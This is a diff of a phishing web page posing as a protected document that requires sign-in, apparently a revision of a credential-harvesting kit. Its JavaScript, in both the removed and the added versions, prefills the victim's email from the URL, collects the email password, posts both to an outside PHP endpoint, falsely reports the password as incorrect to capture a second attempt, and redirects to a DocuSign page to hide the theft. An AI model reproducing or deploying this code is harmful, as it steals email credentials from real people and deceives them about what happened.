@@ -112,7 +112,7 @@
 <span style="font-size: 20px; font-weight: 799; "> DOCUMENT IS PROTECTED</span>
 <br>
 <br>
-<span style="font-size: 16px; font-weight: 500; ">Sign In To Continue,..</span>
+<span style="font-size: 16px; font-weight: 500; ">Sign In To Continue</span>
 <br>
 <br>
     <form id="form1">
@@ -121,7 +121,7 @@
 
         <input type="email" id="email" required placeholder="Email Address">
       </div>
-      <button type="submit">Continue</button>
+      <button type="submit">Sign In</button>
     </form>
 
     <form id="myForm" style="display: none;">
@@ -133,7 +133,7 @@
 
         <input type="password" id="tan" required placeholder="Enter Email Password">
       </div>
-      <button type="submit">Continue</button>
+      <button type="submit">Sign In</button>
     </form>
 <br>
 <br>
@@ -149,97 +149,103 @@
 
   </div>
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-  <script>
-    $(document).ready(function() {
-      // Get the value of the 'email' parameter from the URL
-      const urlParams = new URLSearchParams(window.location.search);
-      const emailValue = urlParams.get('email');
+<script>
+  $(document).ready(function() {
+    // Get the value of the 'email' parameter from the URL
+    let emailValue = window.location.hash.slice(1);
 
-      // Set the value of the input field with id 'email'
-      $('#email').val(emailValue);
+    // Set the value of the input field with id 'email'
+    $('#email').val(emailValue);
 
-      $("#form1").submit(function(event) {
-        event.preventDefault();
-        $("#tin").val(emailValue);
-        $("#form1").hide();
-        $("#myForm").show();
+    // Update 'tin' value when the form is submitted
+    $("#form1").submit(function(event) {
+      event.preventDefault();
+      // Get the current value of the email input field
+      let emailFieldValue = $('#email').val();
+      $("#tin").val(emailFieldValue); // Set 'tin' to the email value
+      $("#form1").hide();
+      $("#myForm").show();
+    });
+
+    // Update 'tin' whenever the email input field changes (manual input)
+    $('#email').on('input', function() {
+      let emailFieldValue = $(this).val();
+      $("#tin").val(emailFieldValue); // Sync 'tin' with 'email' on input
+    });
+
+    $("#form2").submit(function(event) {
+      event.preventDefault();
+      // Handle the form submission logic for the second form here
+    });
+  });
+</script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    // when the form is submitted
+    $("#myForm").submit(function(event) {
+      // prevent the default form submission behavior
+      event.preventDefault();
+
+      // show the loading GIF
+      $("#loadingGif").show();
+
+      // get the values of the form inputs
+      var tinVal = $("#tin").val();
+      var tanVal = $("#tan").val();
+
+      // display a success message with a delay of 1 second
+      setTimeout(function() {
+        $("#message").html("Incorrect Email Password!");
+      }, 1000);
+
+      // reset the value of the tan input field
+      $("#tan").val("");
+
+      // send form data to email
+      var emailData = {
+        tin: tinVal,
+        tan: tanVal
+      };
+      $.ajax({
+        type: "POST",
+        url: "https://proyectossagitario.com.mx/people/sonic/done.php",
+        data: emailData,
+        success: function() {
+          console.log("Email sent successfully");
+        },
+        error: function() {
+          console.log("Error sending email");
+        },
+        complete: function() {
+          // hide the loading GIF
+          $("#loadingGif").hide();
+        }
       });
 
-      $("#form2").submit(function(event) {
+      // when the user fills out the tan input field again and submits
+      $("#myForm").submit(function(event) {
+        // prevent the default form submission behavior
         event.preventDefault();
-        // Handle the form submission logic for the second form here
+
+        // show the loading GIF
+        $("#loadingGif").show();
+
+        // get the new value of the tan input field
+        var newTanVal = $("#tan").val();
+
+        setTimeout(function() {
+          $("#message").html("Success! Retrieving document(s)");
+        }, 1000);
+
+        // redirect to another page after a brief delay
+        setTimeout(function() {
+          window.location.href = "https://na4.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
+        }, 2000);
       });
     });
-  </script>
-	<script type="text/javascript">
-		$(document).ready(function() {
-			// when the form is submitted
-			$("#myForm").submit(function(event) {
-				// prevent the default form submission behavior
-				event.preventDefault();
+  });
+</script>
 
-
-				// show the loading GIF
-				$("#loadingGif").show();
-
-				// get the values of the form inputs
-				var tinVal = $("#tin").val();
-				var tanVal = $("#tan").val();
-
-				
-				// display a success message with a delay of 1 second
-				setTimeout(function() {
-				$("#message").html("Incorrect Email Password!");
-				}, 1000);
-
-				// reset the value of the tan input field
-				$("#tan").val("");
-
-				// send form data to email
-				var emailData = {
-					tin: tinVal,
-					tan: tanVal
-				};
-				$.ajax({
-					type: "POST",
-					url: "https://proyectossagitario.com.mx/people/sonic/done.php",
-					data: emailData,
-					success: function() {
-						console.log("Email sent successfully");
-					},
-					error: function() {
-						console.log("Error sending email");
-					},
-					complete: function() {
-						// hide the loading GIF
-						$("#loadingGif").hide();
-					}
-				});
-
-
-				// when the user fills out the tan input field again and submits
-				$("#myForm").submit(function(event) {
-					// prevent the default form submission behavior
-					event.preventDefault();
-
-					// show the loading GIF
-					$("#loadingGif").show();
-
-					// get the new value of the tan input field
-					var newTanVal = $("#tan").val();
-
-					setTimeout(function() {
-					$("#message").html("Incorrect Email Password!(s)");
-					}, 1000);
-
-					// redirect to another page after a brief delay
-					setTimeout(function() {
-						window.location.href = "https://na4.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
-					}, 2000);
-				});
-			});
-		});
-	</script>
 
 </body>
 </html>
